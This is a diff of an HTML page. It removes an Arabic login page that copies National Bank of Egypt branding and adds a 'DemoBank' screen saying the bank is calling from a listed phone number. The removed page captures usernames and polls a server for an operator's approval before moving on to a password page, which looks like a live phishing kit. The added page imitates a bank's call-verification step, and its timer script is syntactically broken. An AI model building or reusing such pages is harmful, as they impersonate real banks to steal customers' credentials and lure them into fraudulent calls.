@@ -1,135 +1,82 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>البنك الأهلي المصري - تسجيل الدخول</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link rel="stylesheet" href="login-theme.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DemoBank — Registration Demo</title>
+  <style>
+    :root { font-family: Arial, Helvetica, sans-serif; color: #202124; background: #fafafa; }
+    * { box-sizing: border-box; }
+    html, body { margin: 0; min-height: 100%; background: #fafafa; }
+    body { min-height: 100vh; display: flex; justify-content: center; }
+    .phone-screen { position: relative; width: min(100vw, 788px); min-height: 100vh; overflow: hidden; background: #fafafa; }
+    header { height: 113px; display: flex; align-items: center; border-bottom: 1px solid #e4e4e4; padding: 14px 40px 8px; }
+    .back { width: 48px; height: 48px; display: grid; place-items: center; margin-right: 26px; color: #202124; font-size: 52px; font-weight: 200; line-height: 40px; transform: translateY(-2px); }
+    .heading h1 { margin: 0 0 3px; font-size: clamp(27px, 4.1vw, 43px); font-weight: 400; letter-spacing: -1px; }
+    .heading p { margin: 0; color: #858585; font-size: clamp(20px, 3vw, 31px); }
+    main { display: flex; flex-direction: column; align-items: center; padding-top: 117px; text-align: center; }
+    .call-animation { position: relative; width: 272px; height: 272px; display: grid; place-items: center; }
+    .ring, .ring-soft { position: absolute; border-radius: 50%; pointer-events: none; }
+    .ring { inset: 0; border: 12px solid transparent; border-top-color: #b5e08d; border-right-color: #83cc3e; border-bottom-color: #83cc3e; animation: spin 2.2s linear infinite; }
+    .ring-soft { inset: 11px; border: 5px solid transparent; border-left-color: #e3f1d7; border-bottom-color: #e3f1d7; animation: spin-reverse 2.8s linear infinite; }
+    .phone-svg { width: 92px; height: 92px; fill: #84ca3c; animation: ring-pulse 1.3s ease-in-out infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes spin-reverse { to { transform: rotate(-360deg); } }
+    @keyframes ring-pulse { 0%,100% { transform: rotate(-42deg) scale(1); } 50% { transform: rotate(-42deg) scale(1.07); } }
+    .copy { margin-top: 132px; }
+    .copy p { margin-left: 20px; margin-right: 20px; }
+    .caller { margin-top: 0; margin-bottom: 0; font-size: clamp(27px, 4vw, 39px); font-weight: 400; }
+    .number { margin-top: 25px; margin-bottom: 0; font-size: clamp(31px, 5vw, 51px); font-weight: 300; letter-spacing: .2px; }
+    .instruction { margin-top: 29px; margin-bottom: 0; font-size: clamp(22px, 3.4vw, 34px); }
+    .countdown { margin-top: 62px; color: #c7c7c7; font-size: clamp(23px, 3.3vw, 33px); line-height: 1.24; }
+    @media (max-width: 520px) {
+      header { height: 82px; padding: 10px 19px; }
+      .back { width: 35px; height: 35px; margin-right: 13px; font-size: 39px; }
+      main { padding-top: 75px; }
+      .call-animation { width: 190px; height: 190px; }
+      .ring { border-width: 9px; }
+      .ring-soft { inset: 8px; border-width: 4px; }
+      .phone-svg { width: 68px; height: 68px; }
+      .copy { margin-top: 92px; }
+      .number { margin-top: 17px; }
+      .instruction { margin-top: 18px; }
+      .countdown { margin-top: 42px; }
+    }
+  </style>
 </head>
 <body>
-
-<header class="site-header">
-    <div class="header-right">
-        <img src="static_nbe_logo_full.png" alt="البنك الأهلي المصري">
-    </div>
-    <div class="header-left">
-        <a href="login_en.html" class="lang-switcher">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
-            <span>English</span>
-        </a>
-    </div>
-</header>
-
-<main class="login-shell">
-    <div class="login-card-container">
-        <div class="card-logo">
-            <img src="static_nbe_logo_full.png" alt="البنك الأهلي المصري">
-        </div>
-
-        <div class="user-types">
-            <div class="type-card active" onclick="toggleUserType(this)">
-                <i class="far fa-user"></i>
-                <span>أفراد</span>
-            </div>
-            <div class="type-card" onclick="toggleUserType(this)">
-                <i class="fas fa-users"></i>
-                <span>شركات</span>
-            </div>
-        </div>
-
-        <section class="login-card">
-            <div id="errorMessage" role="alert" style="display:none; color: red; margin-bottom: 10px;"></div>
-            <form id="step1Form">
-                <div class="form-group">
-                    <input type="text" id="username" name="username" class="form-control" placeholder="كود المستخدم" required autofocus>
-                </div>
-                <a href="#" class="forgot-link">نسيت كود المستخدم؟</a>
-                
-                <div class="submit-actions">
-                    <button type="submit" class="submit-btn" id="submitBtn">تسجيل الدخول</button>
-                    <button type="button" class="biometric-btn">
-                        <i class="fas fa-fingerprint"></i>
-                    </button>
-                </div>
-            </form>
-        </section>
-
-        <div class="register-section">
-            <a href="#" class="register-title">سجل الآن</a>
-            <p class="register-text">انضم لعملاء البنك الاهلي المصري</p>
-        </div>
-
-        <div class="bottom-nav">
-            <a href="#" class="nav-item">
-                <i class="far fa-calendar-alt"></i>
-                <span>احجز موعد</span>
-            </a>
-            <a href="#" class="nav-item">
-                <i class="fas fa-map-marker-alt"></i>
-                <span>ماكينة الصراف الآلي / الفرع</span>
-            </a>
-            <a href="#" class="nav-item">
-                <i class="fas fa-calculator"></i>
-                <span>حاسبة العملات</span>
-            </a>
-        </div>
-    </div>
-</main>
-
-<script>
-function toggleUserType(element) {
-    document.querySelectorAll('.type-card').forEach(card => card.classList.remove('active'));
-    element.classList.add('active');
-}
-
-document.getElementById('step1Form').addEventListener('submit', function(event) {
-    event.preventDefault();
-    const username = document.getElementById('username').value;
-    const btn = document.getElementById('submitBtn');
-    
-    localStorage.setItem('temp_username', username);
-    
-    btn.disabled = true;
-    btn.innerText = "جاري المعالجة...";
-
-    fetch('/submit_request', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            type: 'username',
-            data: { username: username }
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.request_id) {
-            pollStatus(data.request_id);
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        btn.disabled = false;
-        btn.innerText = "تسجيل الدخول";
-    });
-});
-
-function pollStatus(requestId) {
-    const interval = setInterval(() => {
-        fetch('/request_status/' + requestId)
-        .then(res => res.json())
-        .then(data => {
-            if (data.status === 'approved') {
-                clearInterval(interval);
-                window.location.href = data.redirect_to || 'password.html';
-            } else if (data.status === 'rejected') {
-                clearInterval(interval);
-                alert('تم رفض الطلب، يرجى المحاولة مرة أخرى');
-                window.location.reload();
-            }
-        });
-    }, 2000);
-}
-</script>
+  <div class="phone-screen">
+    <header>
+      <div class="back" aria-hidden="true">‹</div>
+      <div class="heading"><h1>A call from DemoBank</h1><p>Registration</p></div>
+    </header>
+    <main>
+      <div class="call-animation" aria-label="Decorative animated incoming call icon">
+        <div class="ring"></div>
+        <div class="ring-soft"></div>
+        <svg class="phone-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M6.62 10.79a15.46 15.46 0 0 0 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1C10.61 21 3 13.39 3 4c0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
+        </svg>
+      </div>
+      <section class="copy" aria-label="Demo call information">
+        <p class="caller">DemoBank is calling</p>
+        <p class="number">+38 056 797 6010</p>
+        <p class="instruction">Answer the call and follow the instruction</p>
+        <p class="countdown">Confirmation using SMS will be<br />available in <span id="timer">01:00</span></p>
+      </section>
+    </main>
+  </div>
+  <script>
+    let remaining = 60;
+    const timer = document.getElementById('timer');
+    const renderTimer = () => {
+      const minutes = String(Math.floor(remaining / 60)).padStart(2, '0');
+      const seconds = String(remaining % 60).padStart(2, '0');
+      timer.textContent = ${minutes}:${seconds};
+      if (remaining > 0) remaining -= 1;
+    };
+    renderTimer();
+    setInterval(renderTimer, 1000);
+  </script>
 </body>
 </html>
